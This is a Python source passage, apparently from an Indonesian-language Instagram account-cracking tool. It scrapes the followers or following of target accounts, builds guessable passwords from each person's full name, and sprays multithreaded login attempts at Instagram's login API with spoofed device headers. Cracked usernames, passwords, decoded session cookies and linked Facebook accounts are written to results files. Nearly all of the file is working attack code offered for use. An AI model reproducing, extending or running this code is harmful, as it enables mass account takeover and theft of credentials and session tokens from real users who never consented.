            try:
                curl = requests.Session()
                curl.headers.update({
                    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)',
                    'x-csrftoken': re.search('csrftoken=(.*?);', cookies['cookie']).group(1)
                })
                url = 'https://i.instagram.com/api/v1/friendships/{}/{}/?count=100&max_id={}'.format(uid, type, cursor)
                response = curl.get(url, cookies=cookies).json()
                for i in response['users']:
                    username = i['username']
                    full_name = i['full_name']
                    dumps.append(f'{username}<=>{full_name}\n')
                KenXinDev(f'[bold bright_black]   ──> Berhasil mengumpulkan user : [bold yellow]{len(dumps)}', end='\r')
                if 'next_max_id' in response:
                    cursor = response['next_max_id']
                else:
                    break
            except KeyboardInterrupt:
                KenXin_Warning('KeyboardInterrupt!!')
                sleep(3)
                break
            except requests.exceptions.TooManyRedirects:
                KenXin_Error('Terjadi kesalahan ketika mengambil data')
                sleep(3)
                break
    def crack_following(self):
        try:
            cookies = json.loads(open('data/cookie.json', 'r').read())
            query = "58712303d941c6855d4e888c5f0cd22f"
            KenXinDev(Panel("[bold white]Masukan username target, pastikan target tidak private atau centang biru dan target memiliki following. Gunakan tanda koma jika ingin dump massal[/]",subtitle="[bold bright_black]╭──────", width=80, subtitle_align='left', style='bold bright_black', title="[bold bright_black]>> [Dump Following] <<", title_align='center'))
            username = KenXin_Input()
            if not username:
                KenXin_Error('Username target harus diisi!')
                sleep(3)
                self.crack_following()
            for user in username.split(','):
                uid = self.getUserID(user, cookies)
            try:self.curl_graphql(True, query, cookies, uid, '', 'edge_follow')
            except Exception:pass
            if len(dumps) < 50:
                KenXin_Warning('Following terlalu sedikit!')
                sleep(3)
                self.crack_following()
            else:
                self.settings()
        except Exception as e:
            KenXin_Error(f'Terjadi kesalahan: {str(e)}')
            sleep(3)
    
    def crack_followers(self):
        try:
            cookies = json.loads(open('data/cookie.json', 'r').read())
            query = "37479f2b8209594dde7facb0d904896a"
            KenXinDev(Panel("[bold white]Masukan username target, pastikan target tidak private atau centang biru dan target memiliki followers gunakan tanda koma jika ingin dump massal[/]",subtitle="[bold bright_black]╭──────", width=80, subtitle_align='left', style='bold bright_black', title="[bold bright_black]>> [Dump Followers] <<", title_align='center'))
            username = KenXin_Input()
            if not username:
                KenXin_Error('Username target harus diisi!')
                sleep(3)
                self.crack_followers()
            for user in username.split(','):
                uid = self.getUserID(user, cookies)
            try:self.curl_graphql(True, query, cookies, uid, '', 'edge_followed_by')
            except Exception:pass
            if len(dumps) < 50:
                KenXin_Warning('Following terlalu sedikit!')
                sleep(3)
                self.crack_followers()
            else:
                self.settings()
        except Exception as e:
            KenXin_Error(f'Terjadi kesalahan: {str(e)}')
            sleep(3)
    
    def getUserID(self, username, cookies):
        try:
            response = requests.get('https://i.instagram.com/api/v1/users/web_profile_info/?username={}'.format(username), headers=self.headers(), cookies=cookies).json()
            return response['data']['user']['id']
        except Exception as e:
            KenXin_Error(f'Terjadi kesalahan: {str(e)}')
            return None
    
    def curl_graphql(self, type, query, cookies, userid, cursor, dump_type):
        try:
            end_after = ('variables={"id":"%s","first":24,"after":"%s"}'%(userid,cursor))
            params = ("query_hash={}&{}".format(query,end_after))
            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
                "x-csrftoken": re.search('csrftoken=(.*?);', str(cookies['cookie'])).group(1),
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
            }
            response = requests.get('https://www.instagram.com/graphql/query/', headers=headers, params=params, cookies=cookies).json()
            edges = response['data']['user'][dump_type]['edges']
            for edge in edges:
                if edge not in dumps:
                    username = edge['node']['username']
                    fullname = edge['node']['full_name']
                    dumps.append(f'{username}<=>{fullname}\n')
                    KenXinDev(f'[bold bright_black]   ──> Berhasil mengumpulkan user : [bold yellow]{len(dumps)}', end='\r')
            end_cursor = response['data']['user'][dump_type]['page_info']['has_next_page']
            if end_cursor is True:
                cursor = response['data']['user'][dump_type]['page_info']['end_cursor']
                self.curl_graphql(type, query, cookies, userid, cursor, dump_type)
        except (requests.exceptions.TooManyRedirects) as e:
            KenXin_Error(f'Terjadi kesalahan: {str(e)}')
            sleep(3)
        except KeyboardInterrupt:
            KenXin_Warning('KeyboardInterrupt!  ')
            sleep(3)
            
    
    def settings(self):
        print()
        KenXinDev(Panel('[bold white]Apakah anda ingin menampilkan result cp? ketik [bold red]ya[/bold red]/[bold yellow]tidak[/bold yellow] di keyboardmu[/]', style='bold bright_black', width=80, title='[bold bright_black]>> [Checkpoint Settings] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
        memeg = KenXin_Input()
        if memeg.lower() == 'ya':
            display_cp.append(memeg)
        elif memeg.lower() == 'tidak':
            display_cp.append(memeg)
        else:
            display_cp.append('tidak')
        KenXinDev(Panel('''[bold white]01. Nama 1-4            02. Nama 1-5
03. Nama 1-6            04. Nama 1-6 + Kombinasi manual
05. Manual Password     00. Back to Menu[/]''', style='bold bright_black', width=80, title='[bold bright_black]>> [Password Settings] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
        kombinasi = KenXin_Input()
        if kombinasi == '01' or kombinasi == '1':
            self.exec_method(kombinasi)
        elif kombinasi == '02' or kombinasi == '2':
            self.exec_method(kombinasi)
        elif kombinasi == '03' or kombinasi == '3':
            self.exec_method(kombinasi)
        elif kombinasi == '04' or kombinasi == '4':
            KenXinDev(Panel('[bold white]Masukan password kombinasi manual anda, dan gunakan tanda ([bold green]koma[/bold green]) sebagai pemisah.[/]',style='bold bright_black', width=80, title='[bold bright_black]>> [Kombinasi Password] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
            manual_password = KenXin_Input()
            if not manual_password:
                KenXin_Warning('Password manual harus diisi!!')
                sleep(3)
                self.settings()
            self.exec_method(kombinasi, manual_password)
        elif kombinasi == '05' or kombinasi == '5':
            KenXinDev(Panel('[bold white]Masukan password manual anda, dan gunakan tanda ([bold green]koma[/bold green]) sebagai pemisah.[/]', style='bold bright_black', width=80, title='[bold bright_black]>> [Manual Password] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
            manual_password = KenXin_Input()
            if not manual_password:
                KenXin_Warning('Password manual harus diisi!!')
                sleep(3)
                self.settings()
            self.exec_method(kombinasi, manual_password)
        elif kombinasi == '00' or kombinasi == '0':
            self.check_cookie()
        else:
            KenXin_Warning('Wrong Input!!')
            time.sleep(3)
            self.settings()

    def info(self):
        KenXinDev(Panel('[bold white]Jika tidak mendapatkan hasil atau spam ip mainkan mode pesawat selama 5 detik[/]', style='bold bright_black', width=80, title='[bold bright_black]>> [Instagram Info] <<'))
        memeg = []
        memeg.append(Panel('[bold green]{}[/]'.format(success_file_insta), style='bold bright_black', title='[bold bright_black]>> [Success Saved In] <<'))
        memeg.append(Panel('[bold yellow]{}[/]'.format(checkpoint_file_insta), style='bold bright_black', title='[bold bright_black]>> [Checkpoint Saved In] <<'))
        KenXinDev(Columns(memeg))

    def exec_method(self, c, zx=''):
        self.info()
        with Executor(max_workers=30) as shinkai:
            for username_and_fullname in dumps:
                    try:
                        if username_and_fullname.count('<=>') != 1:
                            raise ValueError(f"Format tidak valid: {username_and_fullname}")
                        username, fullname = username_and_fullname.split('<=>')
                        password = self.generate_passwords(fullname, c, zx)
                        shinkai.submit(self.crack, username, password)
                    except (Exception) as e:
                        KenXin_Error(f'Terjadi error: {str(e)}')
                        time.sleep(3)
        print()
        KenXinDev(Panel('[bold white]Crack telah selesai dengan hasil ok dan cp : [bold green]{}[/bold green]/[bold yellow]{}[/bold yellow][/]'.format(len(success), len(checkpoint)), width=80, style='bold bright_black', title='[bold bright_black]>> [Instagram Info] <<[/]'))
        time.sleep(3)
        exit()

    def generate_passwords(self, name, kombinasi, zx=''):
        self.password = []
        for nama in name.split(" "):
            w = nama.lower()
            if len(w) < 3:
                continue
            generated_passwords = []
            if kombinasi in ['1', '01']:
                generated_passwords.extend([w, w + '123', w + '1234', w + '321', w+'01', w+'02', w+'03'])
            elif kombinasi in ['2', '02']:
                generated_passwords.extend([w, w + '123', w + '1234', w + '12345', w + '321', w+'01', w+'02', w+'03', w+'04', w+'05'])
            elif kombinasi in ['3', '03']:
                generated_passwords.extend([w, w + '123', w + '1234', w + '12345', w + '321', w + '123456', w+'01', w+'02', w+'03', w+'04', w+'05', w+'06'])
            elif kombinasi in ['4', '04']:
                ii = [w, w + '123', w + '1234', w + '12345', w + '321', w + '123456', w+'01', w+'02', w+'03', w+'04', w+'05', w+'06']
                generated_passwords.extend(ii + [pwd.strip() for pwd in zx.split(',') if pwd.strip()])
            elif kombinasi in ['5', '05']:
                generated_passwords.extend([pwd.strip() for pwd in zx.split(',') if pwd.strip()])
            self.password.extend([pwd for pwd in generated_passwords if len(pwd) >= 6])
        return self.password
    
    def info_acc(self, username):
        try:
            with requests.Session() as r:
                headers = {
                    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)'
                }
                response = r.get('https://i.instagram.com/api/v1/users/web_profile_info/?username={}'.format(username), headers=headers).json()
                return (
                    response['data']['user']["full_name"],
                    response['data']['user']["edge_followed_by"]["count"],
                    response['data']['user']["edge_follow"]["count"],
                    response['data']['user']["edge_owner_to_timeline_media"]["count"]
                )
        except Exception as e:
            return (None, None, None, None)
    def facebook_acc(self, cookie):
        with requests.Session() as r:
            try:
                # Ekstrak csrftoken dari cookie
                self.csrftoken = re.search('csrftoken=(.*?);', str(cookie))
                self.csrftoken = self.csrftoken.group(1) if self.csrftoken else "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w"
                self.headers = {
                    "Host": "www.instagram.com",
                    "content-length": "0",
                    "x-requested-with": "XMLHttpRequest",
                    "x-csrftoken": self.csrftoken,
                    "x-ig-app-id": "936619743392459",
                    "x-instagram-ajax": "1011212827",
                    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                    "content-type": "application/x-www-form-urlencoded",
                    "accept": "*/*",
                    "x-asbd-id": "129477",
                    "cookie": cookie
                }
                response = r.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers=self.headers).json()
                if 'fbAccount' in response:
                    self.nama = response['fbAccount'].get('display_name', 'Unknown')
                    self.response2 = r.get('https://accountscenter.instagram.com/profiles/', cookies={'cookie': cookie}).text
                    match = re.search(r'{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(self.response2))
                    self.username = match.group(1) if match else None
                else:
                    self.nama = None
                    self.username = None
            except Exception as e:
                self.nama = 'Response error'
                self.username = 'Response error'
            return "{}|{}".format(self.username, self.nama)
    def crack(self, user, password):
        global loop, success, checkpoint
        KenXinDev(f'[bold bright_black]   ──> [bold white]Crack {user[:6]}/{len(dumps)}/[bold green]{len(success)}[/bold green]/[bold yellow]{len(checkpoint)}[/bold yellow]/{loop}[/]', end='\r')
        useragent_generate = UserAgent().instagram_app()
        curl = requests.Session()
        for passwd in password:
            try:
                curl.headers.update({
                        "Host": "i.instagram.com",
                        "X-Ig-App-Locale": "in_ID",
                        "X-Ig-Device-Locale": "in_ID",
                        "X-Ig-Mapped-Locale": "id_ID",
                        "X-Pigeon-Session-Id": f'UFS-{str(uuid.uuid4())}-3',
                        "X-Pigeon-Rawclienttime": '{:.3f}'.format(time.time()),
                        "X-Ig-Bandwidth-Speed-Kbps": '{}'.format(random.randint(100, 999)),
                        "X-Ig-Bandwidth-Totalbytes-B": str(random.randint(2000, 5000)),
                        "X-Ig-Bandwidth-Totaltime-Ms": str(random.randint(500, 4000)),
                        "X-Bloks-Version-Id": self.helper.get_random_block_id(),
                        "X-Ig-Www-Claim": "0",
                        "X-Bloks-Prism-Button-Version": "CONTROL",
                        "X-Bloks-Prism-Colors-Enabled": "false",
                        "X-Bloks-Prism-Ax-Base-Colors-Enabled": "false",
                        "X-Bloks-Prism-Font-Enabled": "false",
                        "X-Ig-Attest-Params": json.dumps({"attestation":[{"version":2,"type":"keystore","errors":[-1004],"challenge_nonce":"","signed_nonce":"","key_hash":""}]}),
                        "X-Bloks-Is-Layout-Rtl": "false",
                        "X-Ig-Device-Id": str(uuid.uuid4()),
                        "X-Ig-Family-Device-Id": str(uuid.uuid4()),
                        "X-Ig-Android-Id": 'android-%s'%(self.helper.generate_android_id(user, passwd)[:16]),
                        "X-Ig-Timezone-Offset": str(self.helper.get_timezone_offset()),
                        "X-Ig-Nav-Chain": "com.bloks.www.caa.login.aymh.screen_query:com.bloks.www.caa.login.aymh.screen_query:1:button:1742335401.917::",
                        "X-Fb-Connection-Type": self.helper.UseNet()[0],
                        "X-Ig-Connection-Type": self.helper.UseNet()[1],
                        "X-Ig-Capabilities": "3brTv10=",
                        "X-Ig-App-Id": "567067343352427",
                        "Priority": "u=3",
                        "User-Agent": useragent_generate,
                        "Accept-Language": "id-ID, en-US",
                        "X-Mid": self.helper.get_random_machine_id(),
                        "Ig-Intended-User-Id": "0",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Accept-Encoding": "gzip, deflate, br",
                        "X-Fb-Http-Engine": "Liger",
                        "X-Fb-Client-Ip": "True",
                        "X-Fb-Server-Cluster": "True"
                        })
                data = {
                    'params': json.dumps({
                        "client_input_params": {
                            "sim_phones": [],
                            "secure_family_device_id": "",
                            "has_granted_read_contacts_permissions": 0,
                            "auth_secure_device_id": "",
                            "has_whatsapp_installed": 0,
                            "password": f"#PWD_INSTAGRAM:0:{int(time.time())}:{passwd}",
                            "sso_token_map_json_string": "",
                            "event_flow": "login_manual",
                            "password_contains_non_ascii": "false",
                            "client_known_key_hash": "",
                            "encrypted_msisdn": "",
                            "has_granted_read_phone_permissions": 0,
                            "app_manager_id": "",
                            "device_id": curl.headers['X-Ig-Android-Id'],
                            "login_attempt_count": 1,
                            "machine_id": curl.headers["X-Mid"],
                            "accounts_list": [],
                            "family_device_id": curl.headers["X-Ig-Family-Device-Id"],
                            "fb_ig_device_id": [],
                            "device_emails": [],
                            "try_num": 1,
                            "lois_settings": {"lois_token": "", "lara_override": ""},
                            "event_step": "home_page",
                            "headers_infra_flow_id": "",
                            "openid_tokens": {},
                            "contact_point": user
                        },
                        "server_params": {
                            "should_trigger_override_login_2fa_action": 0,
                            "is_from_logged_out": 0,
                            "should_trigger_override_login_success_action": 0,
                            "login_credential_type": "none",
                            "server_login_source": "login",
                            "waterfall_id": None,
                            "login_source": "Login",
                            "is_platform_login": 0,
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "offline_experiment_group": None,
                            "is_from_landing_page": 0,
                            "password_text_input_id": "ofmgp5:146",
                            "is_from_empty_password": 0,
                            "is_from_msplit_fallback": 0,
                            "ar_event_source": "login_home_page",
                            "username_text_input_id": "ofmgp5:145",
                            "layered_homepage_experiment_group": None,
                            "should_show_nested_nta_from_aymh": 1,
                            "device_id": None,
                            "INTERNAL__latency_qpl_instance_id": 1.47743053700275E14,
                            "reg_flow_source": "cacheable_aymh_screen",
                            "is_caa_perf_enabled": 1,
                            "credential_type": "password",
                            "is_from_password_entry_page": 0,
                            "caller": "gslr",
                            "family_device_id": None,
                            "is_from_assistive_id": 0,
                            "access_flow_version": "LEGACY_FLOW",
                            "is_from_logged_in_switcher": 0
                        }
                    }),
                    'bk_client_context': json.dumps({
                        "bloks_version": curl.headers["X-Bloks-Version-Id"],
                        "styles_id": "instagram"
                    }),
                    'bloks_versioning_id': curl.headers["X-Bloks-Version-Id"]
                }
                response = curl.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True).text
                if 'logged_in_user' in str(response):
                    success.append(user)
                    try:
                        ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1)
                        decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_autorization.split('Bearer IGT:2:')[1]))
                    except Exception as e:
                        print(e)
                    try:
                        cookie = (';'.join(['%s=%s'%(name, value) for name, value in decode_ig_set_authorization.items()]))
                    except Exception as e:
                        cookie = ('Cookies tidak di temukan')
                    try:
                        fb_account = self.facebook_acc(cookie)
                    except (UnboundLocalError) as e: pass
                    try:
                        nama, pengikut, mengikuti, postingan = self.info_acc(user)
                    except (UnboundLocalError) as e: pass
                    render = Panel("[bold green]fullname: {}\nusername: {}\npassword: {}\nfollowers: {}\nfollowing: {}\nfeedpost: {}\nfacebook: {}\ncookies: {}[/]".format(nama, user, passwd, pengikut, mengikuti, postingan, fb_account, cookie), style='bold green')
                    KenXinDev(Panel(render, style='bold bright_black', width=80, title='[bold bright_black]>> [Logged In User] <<[/]'))
                    open(success_file_insta,'a').write('{}|{}|{}|{}|{}|{}\n'.format(user, passwd, pengikut, mengikuti, postingan, cookie))
                    break
                elif 'challenge_required' in str(response):
                    if 'ya' in display_cp:
                        checkpoint.append(user)
                        try:nama, pengikut, mengikuti, postingan = self.info_acc(user)
                        except (UnboundLocalError) as e: pass
                        render = Panel("[bold yellow]fullname: {}\nusername: {}\npassword: {}\nfollowers: {}\nfollowing: {}\nfeedpost: {}\ncheckpoint: [bold red]True[/]".format(nama, user, passwd, pengikut, mengikuti, postingan), style='bold yellow')
                        KenXinDev(Panel(render, style='bold bright_black', width=80, title='[bold bright_black]>> [Challenge Required] <<[/]'))
                        open(checkpoint_file_insta,'a').write('{}|{}\n'.format(user, passwd))
                        break
                    else:
                        checkpoint.append(user)
                        open(checkpoint_file_insta,'a').write('{}|{}\n'.format(user, passwd))
                        break
                else:
                    continue
            except requests.ConnectionError:
                KenXin_Warning('Koneksi Internet Error!')
                time.sleep(5)
                self.crack(user, password)
                loop-=1
                break
            except Exception as e:
                pass
        loop += 1
    
    def validate_results(self, user, passwd, len_results):
        global loop, success, checkpoint
        KenXinDev(f'[bold bright_black]   ──> [bold white]Crack {user[:6]}/{len_results}/[bold green]{len(success)}[/bold green]/[bold yellow]{len(checkpoint)}[/bold yellow]/{loop}[/]', end='\r')
        useragent_generate = UserAgent().instagram_app()
        curl = requests.Session()
        try:
            curl.headers.update({
                        "Host": "i.instagram.com",
                        "X-Ig-App-Locale": "in_ID",
                        "X-Ig-Device-Locale": "in_ID",
                        "X-Ig-Mapped-Locale": "id_ID",
                        "X-Pigeon-Session-Id": f'UFS-{str(uuid.uuid4())}-3',
                        "X-Pigeon-Rawclienttime": '{:.3f}'.format(time.time()),
                        "X-Ig-Bandwidth-Speed-Kbps": '{}'.format(random.randint(100, 999)),
                        "X-Ig-Bandwidth-Totalbytes-B": str(random.randint(2000, 5000)),
                        "X-Ig-Bandwidth-Totaltime-Ms": str(random.randint(500, 4000)),
                        "X-Bloks-Version-Id": self.helper.get_random_block_id(),
                        "X-Ig-Www-Claim": "0",
                        "X-Bloks-Prism-Button-Version": "CONTROL",
                        "X-Bloks-Prism-Colors-Enabled": "false",
                        "X-Bloks-Prism-Ax-Base-Colors-Enabled": "false",
                        "X-Bloks-Prism-Font-Enabled": "false",
                        "X-Ig-Attest-Params": json.dumps({"attestation":[{"version":2,"type":"keystore","errors":[-1004],"challenge_nonce":"","signed_nonce":"","key_hash":""}]}),
                        "X-Bloks-Is-Layout-Rtl": "false",
                        "X-Ig-Device-Id": str(uuid.uuid4()),
                        "X-Ig-Family-Device-Id": str(uuid.uuid4()),
                        "X-Ig-Android-Id": 'android-%s'%(self.helper.generate_android_id(user, passwd)[:16]),
                        "X-Ig-Timezone-Offset": str(self.helper.get_timezone_offset()),
                        "X-Ig-Nav-Chain": "com.bloks.www.caa.login.aymh.screen_query:com.bloks.www.caa.login.aymh.screen_query:1:button:1742335401.917::",
                        "X-Fb-Connection-Type": self.helper.UseNet()[0],
                        "X-Ig-Connection-Type": self.helper.UseNet()[1],
                        "X-Ig-Capabilities": "3brTv10=",
                        "X-Ig-App-Id": "567067343352427",
                        "Priority": "u=3",
                        "User-Agent": useragent_generate,
                        "Accept-Language": "id-ID, en-US",
                        "X-Mid": self.helper.get_random_machine_id(),
                        "Ig-Intended-User-Id": "0",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Accept-Encoding": "gzip, deflate, br",
                        "X-Fb-Http-Engine": "Liger",
                        "X-Fb-Client-Ip": "True",
                        "X-Fb-Server-Cluster": "True"
                        })
            data = {
                    'params': json.dumps({
                        "client_input_params": {
                            "sim_phones": [],
                            "secure_family_device_id": "",
                            "has_granted_read_contacts_permissions": 0,
                            "auth_secure_device_id": "",
                            "has_whatsapp_installed": 0,
                            "password": f"#PWD_INSTAGRAM:0:{int(time.time())}:{passwd}",
                            "sso_token_map_json_string": "",
                            "event_flow": "login_manual",
                            "password_contains_non_ascii": "false",
                            "client_known_key_hash": "",
                            "encrypted_msisdn": "",
                            "has_granted_read_phone_permissions": 0,
                            "app_manager_id": "",
                            "device_id": curl.headers['X-Ig-Android-Id'],
                            "login_attempt_count": 1,
                            "machine_id": curl.headers["X-Mid"],
                            "accounts_list": [],
                            "family_device_id": curl.headers["X-Ig-Family-Device-Id"],
                            "fb_ig_device_id": [],
                            "device_emails": [],
                            "try_num": 1,
                            "lois_settings": {"lois_token": "", "lara_override": ""},
                            "event_step": "home_page",
                            "headers_infra_flow_id": "",
                            "openid_tokens": {},
                            "contact_point": user
                        },
                        "server_params": {
                            "should_trigger_override_login_2fa_action": 0,
                            "is_from_logged_out": 0,
                            "should_trigger_override_login_success_action": 0,
                            "login_credential_type": "none",
                            "server_login_source": "login",
                            "waterfall_id": None,
                            "login_source": "Login",
                            "is_platform_login": 0,
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "offline_experiment_group": None,
                            "is_from_landing_page": 0,
                            "password_text_input_id": "ofmgp5:146",
                            "is_from_empty_password": 0,
                            "is_from_msplit_fallback": 0,
                            "ar_event_source": "login_home_page",
                            "username_text_input_id": "ofmgp5:145",
                            "layered_homepage_experiment_group": None,
                            "should_show_nested_nta_from_aymh": 1,
                            "device_id": None,
                            "INTERNAL__latency_qpl_instance_id": 1.47743053700275E14,
                            "reg_flow_source": "cacheable_aymh_screen",
                            "is_caa_perf_enabled": 1,
                            "credential_type": "password",
                            "is_from_password_entry_page": 0,
                            "caller": "gslr",
                            "family_device_id": None,
                            "is_from_assistive_id": 0,
                            "access_flow_version": "LEGACY_FLOW",
                            "is_from_logged_in_switcher": 0
                        }
                    }),
                    'bk_client_context': json.dumps({
                        "bloks_version": curl.headers["X-Bloks-Version-Id"],
                        "styles_id": "instagram"
                    }),
                    'bloks_versioning_id': curl.headers["X-Bloks-Version-Id"]
                }
            response = curl.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True).text
            if 'logged_in_user' in str(response):
                success.append(user)
                try:
                    ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1)
                    decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_autorization.split('Bearer IGT:2:')[1]))
                except Exception as e:
                    print(e)
                try:
                    cookie = (';'.join(['%s=%s'%(name, value) for name, value in decode_ig_set_authorization.items()]))
                except Exception as e:
                    cookie = ('Cookies tidak di temukan')
                try:
                    fb_account = self.facebook_acc(cookie)
                except (UnboundLocalError) as e: pass
                try:
                    nama, pengikut, mengikuti, postingan = self.info_acc(user)
                except (UnboundLocalError) as e: pass
                render = Panel("[bold green]fullname: {}\nusername: {}\npassword: {}\nfollowers: {}\nfollowing: {}\nfeedpost: {}\nfacebook: {}\ncookies: {}[/]".format(nama, user, passwd, pengikut, mengikuti, postingan, fb_account, cookie), style='bold green')
                KenXinDev(Panel(render, style='bold bright_black', width=80, title='[bold bright_black]>> [Logged In User] <<[/]'))
                open(success_detector_insta, 'a').write('{}|{}|{}|{}|{}|{}\n'.format(user, passwd, pengikut, mengikuti, postingan, cookie))
            elif 'challenge_required' in str(response):
                checkpoint.append(user)
                try:nama, pengikut, mengikuti, postingan = self.info_acc(user)
                except (UnboundLocalError) as e: pass
                render = Panel("[bold yellow]fullname: {}\nusername: {}\npassword: {}\nfollowers: {}\nfollowing: {}\nfeedpost: {}\ncheckpoint: [bold red]True[/]".format(nama, user, passwd, pengikut, mengikuti, postingan), style='bold yellow')
                KenXinDev(Panel(render, style='bold bright_black', width=80, title='[bold bright_black]>> [Challenge Required] <<[/]'))
                open(checkpoint_detector_insta, 'a').write('{}|{}|{}|{}|{}|\n'.format(user, passwd, pengikut, mengikuti, postingan))
            else:
                pass
        except requests.ConnectionError:
            KenXin_Warning('Koneksi Internet Error!')
            time.sleep(5)
            self.crack(user, passwd)
        loop += 1

def create_folder():
    os.makedirs('data', exist_ok=True)
    os.makedirs('results', exist_ok=True)

if __name__ == '__main__':
    create_folder()
    app = Instagram()
    app.check_cookie()
